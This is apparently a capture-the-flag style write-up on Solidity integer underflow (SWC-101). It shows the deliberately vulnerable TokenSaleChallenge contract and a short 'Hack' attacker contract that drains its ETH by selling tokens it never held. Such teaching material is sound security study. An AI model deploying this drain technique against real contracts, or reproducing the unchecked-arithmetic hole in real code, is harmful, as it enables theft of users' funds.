# SWC 101
Overflow and Underflow

### Example
## tokensalechallenge.sol

```solidity 
/*
 * @source: https://capturetheether.com/challenges/math/token-sale/
 * @author: Steve Marx
 */

pragma solidity ^0.4.21;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleChallenge(address _player) public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] - numTokens >= 0);

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}
```
Looking at the contract we can see that it is an older version of solidity
- where arithemetic underflow and overflow did not gave any errors, and 
- require logic `require(balanceOf[msg.sender] - numTokens >= 0)` indicates potential flawed logic/redundant check
> Point 33 [Security Pitfalls and Best Practices 101](https://secureum.substack.com/p/security-pitfalls-and-best-practices-101)

using these two flaws we can exploit the contract and drain the ETH from the contract with the following Hack.

## Hack.sol

```solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITokenSaleChallenge {
    function sell(uint256 numTokens) external;
}

contract Hack {
    ITokenSaleChallenge private target;

    constructor(address _target) {
        target = ITokenSaleChallenge(_target);
        target.sell(1);
    }
}
```
